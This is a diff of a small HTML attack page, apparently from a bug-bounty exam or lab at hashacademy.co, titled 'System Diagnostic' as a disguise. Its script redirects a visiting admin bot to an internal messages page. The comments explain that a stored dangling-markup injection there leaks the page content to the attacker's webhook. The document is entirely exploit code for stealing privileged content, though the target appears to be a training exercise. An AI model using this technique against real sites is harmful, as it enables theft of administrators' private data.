@@ -1,8 +1,13 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>System Diagnostic</title>
+</head>
 <body>
     <script>
-        // Redirect the bot to the internal admin page that renders your contact message
+        // Forces the bot to visit the page where your "Dangling Markup" is stored.
+        // As soon as the page loads, the bot's browser will try to load the 'image'
+        // and send the page content to your webhook.
         window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages";
     </script>
 </body>
